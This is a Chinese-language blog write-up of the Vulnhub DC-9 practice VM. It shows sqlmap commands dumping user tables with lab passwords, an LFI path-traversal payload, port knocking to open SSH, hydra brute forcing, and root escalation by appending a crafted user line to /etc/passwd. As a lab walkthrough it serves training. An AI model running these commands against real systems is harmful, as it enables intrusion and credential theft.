---
title: Vulnhub靶机：DC-9
author: 简文涛
categories:
  - Web
tags:
  - 渗透测试
  - 靶场
comments: true
top: false
summary: Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞。
img: 'https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200824173621.png'
abbrlink: 55886
date: 2020-05-22 20:32:32
updated:
permalink:
---

## DC-9简介

**靶机下载地址：**https://download.vulnhub.com/dc/DC-9.zip

**靶机描述：**DC-9 是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。这一挑战的最终目标是获得root，并阅读唯一的flag。

**涉及漏洞：**SQL注入、LFI

**攻击机：**Kali/192.168.0.104

## 一、信息收集

### 1.探测目标

```bash
$ sudo arp-scan -l
或者
$ sudo netdiscover -i eth0
```

![](https://i.loli.net/2020/05/24/Xhv9srF4p3K6QTt.png)

### 2.查看目标开放端口

```bash
$ sudo nmap -sV -p 0-6553 192.168.0.105
```

![](https://i.loli.net/2020/05/24/iGFDpYN6uMvnHq1.png)

目标靶机开放了80端口,22端口显示被过滤掉了

#### 3.查看网页相关信息

使用浏览器插件`Wappalyzer`，这个插件可以检测网站的CMS，框架，服务器等信息，

![](https://i.loli.net/2020/05/24/qOPklaIWVLFtiTC.png)

但是没有检测到CMS信息

## 二、漏洞查找与利用

### 1.SQL注入

在页面发现一个search框，可以查询用户信息，与数据库有交互，猜测可能存在SQL注入，随便输入数据查询，URL框没有改变，说明是POST方式提交，Burp抓包检测是否存在SQL注入的可能

![](https://i.loli.net/2020/05/24/7JsYehVuf9Wqj6g.png)

可以看出确实存在POST型SQL注入，网站应该对注入做了一些应对措施。过滤啊，屏蔽报错啊

居然存在注入，话不多说，直接上SQLmap跑

```bash
sqlmap -u "http://192.168.0.105/results.php" --data "search=1" --dbs

available databases [3]:
[*] information_schema
[*] Staff
[*] users

--data:指定的数据会被作为POST数据提交
```

发现Staff和users数据库，先看看users库中有什么

**users数据库**

```bash
sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D users --tables

Database: users
[1 table]
+-------------+
| UserDetails |
+-------------+
```

```bash
sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D users -T UserDetails --dump

Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
```

这里是那些员工这账号和密码，后面可能会用到，先放着，然后我们再看看Staff库里面有啥

**Staff数据库**

```bash
sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D Staff --tables

Database: Staff
[2 tables]
+--------------+
| StaffDetails |
| Users        |
+--------------+
```

```bash
sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D Staff -T StaffDetails --dump
```

![](https://i.loli.net/2020/05/24/1ATcKngtzZLsf2Y.png)

```bash
sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D Staff -T Users --dump

#dump完密码的时候会提示你是否解密md5,你选择SQLmap自带的字典就可以跑出明文密码
```

![](https://i.loli.net/2020/05/24/AgQZfhdyX7qrKjk.png)

得到用户名和密码：**admin/transorbital1**然后使用这个用户去站点登录

![](https://i.loli.net/2020/05/24/VPpf2usMIc9jd6F.png)

### 2.本地文件包含LFI

登录后多了`Add Record和Manage`页面，在`Manage`的下面发现了一句话`File does not exits` ，猜测可能存在文件包含漏洞,猜测文件参数是**file**

```
?file=../../../../etc/passwd
```

![](https://i.loli.net/2020/05/24/tqfT64rpaSu1YI8.png)

果然存在LFI漏洞,接下来是`fuzz`一下系统文件

![](../images/Vulnhub%E9%9D%B6%E6%9C%BA%EF%BC%9ADC-9/image-20200524131121933.png)

发现了`/etc/knockd.conf`，这就和之前`nmap`扫描靶机运行了SSH服务，但是状态是`filtered`对应起来了，因为`knockd`可以对SSH进行防护

### 3.端口敲门

> `knockd`字面意思是敲，只是这里敲的是`端口`，而且需要按照顺序‘敲’端口。如果敲击规则匹配，则可以让防火墙实时更改策略。从而达到开关防火墙的目的。

更多详细请看：

- [Port-knocking 简单教程](https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html)

- [端口敲门服务](https://zhuanlan.zhihu.com/p/59488488)

- [保护 SSH 的三把锁](https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html)

看一下`/etc/knockd.conf`文件中的自定义端口

![](https://i.loli.net/2020/05/24/64fRKVQMw1lELkX.png)

有3个自定义端口`7469，8475，9842`,根据`Port-knocking`的规则依次访问这三个端口就可以打开SSH服务了

```bash
sudo nmap -p 7469 192.168.0.105
sudo nmap -p 8475 192.168.0.105
sudo nmap -p 9842 192.168.0.105

或者安装knockd
knock 192.168.0.105 7469 8475 9842
```

![](https://i.loli.net/2020/05/24/JWvxTckDZNijXfO.png)

现在我们看一哈ssh服务被敲开没有

```
sudo nmap -p 22 192.168.0.105
```

![](https://i.loli.net/2020/05/24/jU1YD8TIMEHVX2m.png)

不出所料SSH服务被成功敲开

### 4.hydra爆破SSH账户

将前面所爆出来的那些员工的账号和密码编写成两个字典，进行ssh爆破

| username.txt                                           | password.txt                                           |
| ------------------------------------------------------ | ------------------------------------------------------ |
| ![](https://i.loli.net/2020/05/24/Pekn7KWZwCj68lB.png) | ![](https://i.loli.net/2020/05/24/532jwQDIftZloWb.png) |

```bash
hydra -L username.txt -P password.txt ssh://192.168.0.105 
```

![](https://i.loli.net/2020/05/24/jZfit8YRFUrehVl.png)

爆破出来有3个用户可用，`chandlerb\UrAG0D!`、`joeyt\Passw0rd`、`janitor\Ilovepeepee`

依次登录3个用户，最终在用户`janitor`的目录下找到了隐藏文件

```bash
ssh chandlerb@192.168.0.105 
UrAG0D!

ssh joeyt@192.168.0.105 
Passw0rd

ssh janitor@192.168.0.105 
Ilovepeepee
```

![](https://i.loli.net/2020/05/24/AHniNy6gY4cLIE3.png)

`.secrets-for-putin`隐藏文件中有一个可读文件，打开后这好像是存放的用户密码，然后把这些密码再加进刚刚我们编写的`password.txt`字典中重新再爆破一次看看

![](https://i.loli.net/2020/05/24/VY2IExTHm7dcl51.png)

爆破出了一个新的用户号：`fredf\B4-Tru3-001`

## 三、提升权限

使用`fredf`用户登录靶机

```bash
ssh fredf@192.168.0.105
B4-Tru3-001
```

列出sudo权限的命令，这里发现fred用户在`NOPASSWD`的情况下可以使用root权限运行这个test文件

```bash
sudo -l
```

![](https://i.loli.net/2020/05/24/QTN2BKmgElhRJa1.png)

尝试运行，发现它是一个python文件

![](https://i.loli.net/2020/05/24/1rZh73gSJDRWf4X.png)

使用find查找test.py文件

```bash
find / -name test.py 2>/dev/null

2>/dev/null 代表忽略掉错误提示信息。
```

![](https://i.loli.net/2020/05/24/RHetfyhYCZM8FVo.png)

查看test.py

![image-20200524145858769](https://i.loli.net/2020/05/24/jyYTd4DziHJGgaW.png)

py文件的含义为：`读取参数1的内容，然后将参数1的内容写入到参数2的内容中。`

那我们可以构造一个root权限用户，将该用户信息写入文件内，将改文件作为参数1，`/etc/passwd`作为参数2，这样就创建了一个root权限用户，就能实现提权了

**构造参数1**

```bash
openssl passwd -1 -salt admin 123456

-1 的意思是使用md5加密算法
-salt 自动插入一个随机数作为文件内容加密
admin 123456 用户名和密码
```

![](https://i.loli.net/2020/05/24/T8Uc6xaQY1lnNIk.png)

根据`/etc/passwd`的格式，修改一下，然后存入一个文件里，这个文件就是`参数1`

```bash
echo 'admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash' >> /tmp/passwd
    # 用户名:密码:uid:gid:家目录:登陆后使用的shell
    
sudo ./test /tmp/passwd /etc/passwd    
```

![](https://i.loli.net/2020/05/24/XveFQ2ZUgJj61lk.png)

```bash
su admin
cd /root
ls
cat theflag.txt
```

![](https://i.loli.net/2020/05/24/QL2PaDpKjFMXrcH.png)

![](https://i.loli.net/2020/05/24/L9NzyOlfR5ZpUHq.png)

## 赞助💰

如果你觉得对你有帮助，你可以赞助我一杯冰可乐吧！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>